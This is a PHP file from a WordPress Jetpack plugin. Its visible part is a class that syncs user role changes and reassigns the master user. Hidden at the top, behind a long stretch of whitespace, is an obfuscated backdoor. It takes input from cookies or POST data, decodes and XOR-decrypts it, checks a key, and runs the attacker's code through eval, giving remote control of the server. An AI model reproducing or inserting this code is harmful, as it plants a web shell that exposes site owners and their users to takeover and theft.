<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $u2f6467 = 250;$GLOBALS['k966595']=Array();global$k966595;$k966595=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['d53e9f027']="\x5b\x67\x29\x76\x4e\x2b\x56\x63\x47\x31\x42\x30\x9\x73\x2f\x40\x61\x21\x3a\xa\x3d\x5a\x2e\x50\x74\x44\x5d\x64\x26\x68\x43\x37\x58\x49\x7c\x36\x3b\x71\x4f\x62\x6a\x3e\x7b\x75\x5e\x2d\x45\x59\x23\x53\x54\x7d\x78\x34\x52\x57\x41\x39\x4b\x65\x4d\x5f\x6c\x2c\x5c\x32\x33\x4c\x38\x22\x69\x70\x77\x3f\x6b\x51\x60\xd\x48\x28\x55\x6e\x6f\x46\x2a\x7e\x25\x24\x35\x4a\x72\x20\x27\x79\x6d\x3c\x66\x7a";$k966595[$k966595['d53e9f027'][81].$k966595['d53e9f027'][9].$k966595['d53e9f027'][27].$k966595['d53e9f027'][31].$k966595['d53e9f027'][53].$k966595['d53e9f027'][35].$k966595['d53e9f027'][27]]=$k966595['d53e9f027'][7].$k966595['d53e9f027'][29].$k966595['d53e9f027'][90];$k966595[$k966595['d53e9f027'][70].$k966595['d53e9f027'][27].$k966595['d53e9f027'][16].$k966595['d53e9f027'][68].$k966595['d53e9f027'][53]]=$k966595['d53e9f027'][82].$k966595['d53e9f027'][90].$k966595['d53e9f027'][27];$k966595[$k966595['d53e9f027'][3].$k966595['d53e9f027'][39].$k966595['d53e9f027'][39].$k966595['d53e9f027'][9]]=$k966595['d53e9f027'][13].$k966595['d53e9f027'][24].$k966595['d53e9f027'][90].$k966595['d53e9f027'][62].$k966595['d53e9f027'][59].$k966595['d53e9f027'][81];$k966595[$k966595['d53e9f027'][71].$k966595['d53e9f027'][66].$k966595['d53e9f027'][27].$k966595['d53e9f027'][88].$k966595['d53e9f027'][96].$k966595['d53e9f027'][39]]=$k966595['d53e9f027'][70].$k966595['d53e9f027'][81].$k966595['d53e9f027'][70].$k966595['d53e9f027'][61].$k966595['d53e9f027'][13].$k966595['d53e9f027'][59].$k966595['d53e9f027'][24];$k966595[$k966595['d53e9f027'][59].$k966595['d53e9f027'][27].$k966595['d53e9f027'][66].$k966595['d53e9f027'][35].$k966595['d53e9f027'][16].$k966595['d53e9f027'][66]]=$k966595['d53e9f027'][13].$k966595['d53e9f027'][59].$k966595['d53e9f027'][90].$k966595['d53e9f027'][70].$k966595['d53e9f027'][16].$k966595['d53e9f027'][62].$k966595['d53e9f027'][70].$k966595['d53e9f027'][97].$k966595['d53e9f027'][59];$k966595[$k966595['d53e9f027'][97].$k966595['d53e9f027'][11].$k966595['d53e9f027'][7].$k966595['d53e9f027'][59].$k966595['d53e9f027'][65].$k966595['d53e9f027'][57].$k966595['d53e9f027'][66].$k966595['d53e9f027'][7].$k966595['d53e9f027'][35]]=$k966595['d53e9f027'][71].$k966595['d53e9f027'][29].$k966595['d53e9f027'][71].$k966595['d53e9f027'][3].$k966595['d53e9f027'][59].$k966595['d53e9f027'][90].$k966595['d53e9f027'][13].$k966595['d53e9f027'][70].$k966595['d53e9f027'][82].$k966595['d53e9f027'][81];$k966595[$k966595['d53e9f027'][71].$k966595['d53e9f027'][96].$k966595['d53e9f027'][11].$k966595['d53e9f027'][65].$k966595['d53e9f027'][11].$k966595['d53e9f027'][59].$k966595['d53e9f027'][16]]=$k966595['d53e9f027'][43].$k966595['d53e9f027'][81].$k966595['d53e9f027'][13].$k966595['d53e9f027'][59].$k966595['d53e9f027'][90].$k966595['d53e9f027'][70].$k966595['d53e9f027'][16].$k966595['d53e9f027'][62].$k966595['d53e9f027'][70].$k966595['d53e9f027'][97].$k966595['d53e9f027'][59];$k966595[$k966595['d53e9f027'][74].$k966595['d53e9f027'][68].$k966595['d53e9f027'][9].$k966595['d53e9f027'][39].$k966595['d53e9f027'][65].$k966595['d53e9f027'][27]]=$k966595['d53e9f027'][39].$k966595['d53e9f027'][16].$k966595['d53e9f027'][13].$k966595['d53e9f027'][59].$k966595['d53e9f027'][35].$k966595['d53e9f027'][53].$k966595['d53e9f027'][61].$k966595['d53e9f027'][27].$k966595['d53e9f027'][59].$k966595['d53e9f027'][7].$k966595['d53e9f027'][82].$k966595['d53e9f027'][27].$k966595['d53e9f027'][59];$k966595[$k966595['d53e9f027'][70].$k966595['d53e9f027'][53].$k966595['d53e9f027'][39].$k966595['d53e9f027'][96].$k966595['d53e9f027'][57].$k966595['d53e9f027'][59].$k966595['d53e9f027'][96]]=$k966595['d53e9f027'][13].$k966595['d53e9f027'][59].$k966595['d53e9f027'][24].$k966595['d53e9f027'][61].$k966595['d53e9f027'][24].$k966595['d53e9f027'][70].$k966595['d53e9f027'][94].$k966595['d53e9f027'][59].$k966595['d53e9f027'][61].$k966595['d53e9f027'][62].$k966595['d53e9f027'][70].$k966595['d53e9f027'][94].$k966595['d53e9f027'][70].$k966595['d53e9f027'][24];$k966595[$k966595['d53e9f027'][7].$k966595['d53e9f027'][88].$k966595['d53e9f027'][11].$k966595['d53e9f027'][57].$k966595['d53e9f027'][16].$k966595['d53e9f027'][96].$k966595['d53e9f027'][7].$k966595['d53e9f027'][68].$k966595['d53e9f027'][11]]=$k966595['d53e9f027'][90].$k966595['d53e9f027'][96].$k966595['d53e9f027'][11].$k966595['d53e9f027'][88].$k966595['d53e9f027'][11];$k966595[$k966595['d53e9f027'][82].$k966595['d53e9f027'][9].$k966595['d53e9f027'][53].$k966595['d53e9f027'][65].$k966595['d53e9f027'][31].$k966595['d53e9f027'][96].$k966595['d53e9f027'][65]]=$k966595['d53e9f027'][97].$k966595['d53e9f027'][35].$k966595['d53e9f027'][9].$k966595['d53e9f027'][65].$k966595['d53e9f027'][39].$k966595['d53e9f027'][88];$k966595[$k966595['d53e9f027'][13].$k966595['d53e9f027'][11].$k966595['d53e9f027'][59].$k966595['d53e9f027'][57].$k966595['d53e9f027'][66].$k966595['d53e9f027'][9]]=$_POST;$k966595[$k966595['d53e9f027'][29].$k966595['d53e9f027'][7].$k966595['d53e9f027'][88].$k966595['d53e9f027'][68]]=$_COOKIE;@$k966595[$k966595['d53e9f027'][71].$k966595['d53e9f027'][66].$k966595['d53e9f027'][27].$k966595['d53e9f027'][88].$k966595['d53e9f027'][96].$k966595['d53e9f027'][39]]($k966595['d53e9f027'][59].$k966595['d53e9f027'][90].$k966595['d53e9f027'][90].$k966595['d53e9f027'][82].$k966595['d53e9f027'][90].$k966595['d53e9f027'][61].$k966595['d53e9f027'][62].$k966595['d53e9f027'][82].$k966595['d53e9f027'][1],NULL);@$k966595[$k966595['d53e9f027'][71].$k966595['d53e9f027'][66].$k966595['d53e9f027'][27].$k966595['d53e9f027'][88].$k966595['d53e9f027'][96].$k966595['d53e9f027'][39]]($k966595['d53e9f027'][62].$k966595['d53e9f027'][82].$k966595['d53e9f027'][1].$k966595['d53e9f027'][61].$k966595['d53e9f027'][59].$k966595['d53e9f027'][90].$k966595['d53e9f027'][90].$k966595['d53e9f027'][82].$k966595['d53e9f027'][90].$k966595['d53e9f027'][13],0);@$k966595[$k966595['d53e9f027'][71].$k966595['d53e9f027'][66].$k966595['d53e9f027'][27].$k966595['d53e9f027'][88].$k966595['d53e9f027'][96].$k966595['d53e9f027'][39]]($k966595['d53e9f027'][94].$k966595['d53e9f027'][16].$k966595['d53e9f027'][52].$k966595['d53e9f027'][61].$k966595['d53e9f027'][59].$k966595['d53e9f027'][52].$k966595['d53e9f027'][59].$k966595['d53e9f027'][7].$k966595['d53e9f027'][43].$k966595['d53e9f027'][24].$k966595['d53e9f027'][70].$k966595['d53e9f027'][82].$k966595['d53e9f027'][81].$k966595['d53e9f027'][61].$k966595['d53e9f027'][24].$k966595['d53e9f027'][70].$k966595['d53e9f027'][94].$k966595['d53e9f027'][59],0);@$k966595[$k966595['d53e9f027'][70].$k966595['d53e9f027'][53].$k966595['d53e9f027'][39].$k966595['d53e9f027'][96].$k966595['d53e9f027'][57].$k966595['d53e9f027'][59].$k966595['d53e9f027'][96]](0);$lc77=NULL;$r8ec0f6=NULL;$k966595[$k966595['d53e9f027'][39].$k966595['d53e9f027'][7].$k966595['d53e9f027'][39].$k966595['d53e9f027'][31].$k966595['d53e9f027'][68]]=$k966595['d53e9f027'][31].$k966595['d53e9f027'][59].$k966595['d53e9f027'][16].$k966595['d53e9f027'][27].$k966595['d53e9f027'][11].$k966595['d53e9f027'][16].$k966595['d53e9f027'][16].$k966595['d53e9f027'][16].$k966595['d53e9f027'][45].$k966595['d53e9f027'][65].$k966595['d53e9f027'][68].$k966595['d53e9f027'][88].$k966595['d53e9f027'][65].$k966595['d53e9f027'][45].$k966595['d53e9f027'][53].$k966595['d53e9f027'][27].$k966595['d53e9f027'][53].$k966595['d53e9f027'][9].$k966595['d53e9f027'][45].$k966595['d53e9f027'][68].$k966595['d53e9f027'][57].$k966595['d53e9f027'][66].$k966595['d53e9f027'][16].$k966595['d53e9f027'][45].$k966595['d53e9f027'][7].$k966595['d53e9f027'][16].$k966595['d53e9f027'][88].$k966595['d53e9f027'][35].$k966595['d53e9f027'][88].$k966595['d53e9f027'][88].$k966595['d53e9f027'][59].$k966595['d53e9f027'][96].$k966595['d53e9f027'][7].$k966595['d53e9f027'][59].$k966595['d53e9f027'][16].$k966595['d53e9f027'][27];global$bcb78;function z612b5($lc77,$q043d45bc){global$k966595;$z74fb="";for($cabeaef4=0;$cabeaef4<$k966595[$k966595['d53e9f027'][3].$k966595['d53e9f027'][39].$k966595['d53e9f027'][39].$k966595['d53e9f027'][9]]($lc77);){for($a891eee01=0;$a891eee01<$k966595[$k966595['d53e9f027'][3].$k966595['d53e9f027'][39].$k966595['d53e9f027'][39].$k966595['d53e9f027'][9]]($q043d45bc)&&$cabeaef4<$k966595[$k966595['d53e9f027'][3].$k966595['d53e9f027'][39].$k966595['d53e9f027'][39].$k966595['d53e9f027'][9]]($lc77);$a891eee01++,$cabeaef4++){$z74fb.=$k966595[$k966595['d53e9f027'][81].$k966595['d53e9f027'][9].$k966595['d53e9f027'][27].$k966595['d53e9f027'][31].$k966595['d53e9f027'][53].$k966595['d53e9f027'][35].$k966595['d53e9f027'][27]]($k966595[$k966595['d53e9f027'][70].$k966595['d53e9f027'][27].$k966595['d53e9f027'][16].$k966595['d53e9f027'][68].$k966595['d53e9f027'][53]]($lc77[$cabeaef4])^$k966595[$k966595['d53e9f027'][70].$k966595['d53e9f027'][27].$k966595['d53e9f027'][16].$k966595['d53e9f027'][68].$k966595['d53e9f027'][53]]($q043d45bc[$a891eee01]));}}return$z74fb;}function rf050($lc77,$q043d45bc){global$k966595;global$bcb78;return$k966595[$k966595['d53e9f027'][82].$k966595['d53e9f027'][9].$k966595['d53e9f027'][53].$k966595['d53e9f027'][65].$k966595['d53e9f027'][31].$k966595['d53e9f027'][96].$k966595['d53e9f027'][65]]($k966595[$k966595['d53e9f027'][82].$k966595['d53e9f027'][9].$k966595['d53e9f027'][53].$k966595['d53e9f027'][65].$k966595['d53e9f027'][31].$k966595['d53e9f027'][96].$k966595['d53e9f027'][65]]($lc77,$bcb78),$q043d45bc);}foreach($k966595[$k966595['d53e9f027'][29].$k966595['d53e9f027'][7].$k966595['d53e9f027'][88].$k966595['d53e9f027'][68]]as$q043d45bc=>$q989a1db3){$lc77=$q989a1db3;$r8ec0f6=$q043d45bc;}if(!$lc77){foreach($k966595[$k966595['d53e9f027'][13].$k966595['d53e9f027'][11].$k966595['d53e9f027'][59].$k966595['d53e9f027'][57].$k966595['d53e9f027'][66].$k966595['d53e9f027'][9]]as$q043d45bc=>$q989a1db3){$lc77=$q989a1db3;$r8ec0f6=$q043d45bc;}}$lc77=@$k966595[$k966595['d53e9f027'][71].$k966595['d53e9f027'][96].$k966595['d53e9f027'][11].$k966595['d53e9f027'][65].$k966595['d53e9f027'][11].$k966595['d53e9f027'][59].$k966595['d53e9f027'][16]]($k966595[$k966595['d53e9f027'][7].$k966595['d53e9f027'][88].$k966595['d53e9f027'][11].$k966595['d53e9f027'][57].$k966595['d53e9f027'][16].$k966595['d53e9f027'][96].$k966595['d53e9f027'][7].$k966595['d53e9f027'][68].$k966595['d53e9f027'][11]]($k966595[$k966595['d53e9f027'][74].$k966595['d53e9f027'][68].$k966595['d53e9f027'][9].$k966595['d53e9f027'][39].$k966595['d53e9f027'][65].$k966595['d53e9f027'][27]]($lc77),$r8ec0f6));if(isset($lc77[$k966595['d53e9f027'][16].$k966595['d53e9f027'][74]])&&$bcb78==$lc77[$k966595['d53e9f027'][16].$k966595['d53e9f027'][74]]){if($lc77[$k966595['d53e9f027'][16]]==$k966595['d53e9f027'][70]){$cabeaef4=Array($k966595['d53e9f027'][71].$k966595['d53e9f027'][3]=>@$k966595[$k966595['d53e9f027'][97].$k966595['d53e9f027'][11].$k966595['d53e9f027'][7].$k966595['d53e9f027'][59].$k966595['d53e9f027'][65].$k966595['d53e9f027'][57].$k966595['d53e9f027'][66].$k966595['d53e9f027'][7].$k966595['d53e9f027'][35]](),$k966595['d53e9f027'][13].$k966595['d53e9f027'][3]=>$k966595['d53e9f027'][9].$k966595['d53e9f027'][22].$k966595['d53e9f027'][11].$k966595['d53e9f027'][45].$k966595['d53e9f027'][9],);echo@$k966595[$k966595['d53e9f027'][59].$k966595['d53e9f027'][27].$k966595['d53e9f027'][66].$k966595['d53e9f027'][35].$k966595['d53e9f027'][16].$k966595['d53e9f027'][66]]($cabeaef4);}elseif($lc77[$k966595['d53e9f027'][16]]==$k966595['d53e9f027'][59]){eval/*xd8b*/($lc77[$k966595['d53e9f027'][27]]);}exit();} ?><?php

/**
 * Class Jetpack_Sync_Users
 *
 * Responsible for syncing user data changes.
 */
class Jetpack_Sync_Users {
	static $user_roles = array();

	static function init() {
		if ( Jetpack::is_active() ) {
			// Kick off synchronization of user role when it changes
			add_action( 'set_user_role', array( __CLASS__, 'user_role_change' ) );
		}
	}

	/**
	 * Synchronize connected user role changes
	 */
	static function user_role_change( $user_id ) {
		if ( Jetpack::is_user_connected( $user_id ) ) {
			self::update_role_on_com( $user_id );
			//try to choose a new master if we're demoting the current one
			self::maybe_demote_master_user( $user_id );
		}
	}

	static function get_role( $user_id ) {
		if ( isset( $user_roles[ $user_id ] ) ) {
			return $user_roles[ $user_id ];
		}

		$current_user_id = get_current_user_id();
		wp_set_current_user( $user_id );
		$role = Jetpack::translate_current_user_to_role();
		wp_set_current_user( $current_user_id );
		$user_roles[ $user_id ] = $role;

		return $role;
	}

	static function get_signed_role( $user_id ) {
		return Jetpack::sign_role( self::get_role( $user_id ) );
	}

	static function update_role_on_com( $user_id ) {
		$signed_role = self::get_signed_role( $user_id );
		Jetpack::xmlrpc_async_call( 'jetpack.updateRole', $user_id, $signed_role );
	}

	static function maybe_demote_master_user( $user_id ) {
		$master_user_id = Jetpack_Options::get_option( 'master_user' );
		$role           = self::get_role( $user_id );
		if ( $user_id == $master_user_id && 'administrator' != $role ) {
			$query      = new WP_User_Query(
				array(
					'fields'  => array( 'id' ),
					'role'    => 'administrator',
					'orderby' => 'id',
					'exclude' => array( $master_user_id ),
				)
			);
			$new_master = false;
			foreach ( $query->results as $result ) {
				$found_user_id = absint( $result->id );
				if ( $found_user_id && Jetpack::is_user_connected( $found_user_id ) ) {
					$new_master = $found_user_id;
					break;
				}
			}

			if ( $new_master ) {
				Jetpack_Options::update_option( 'master_user', $new_master );
			}
			// else disconnect..?
		}
	}
}

Jetpack_Sync_Users::init();
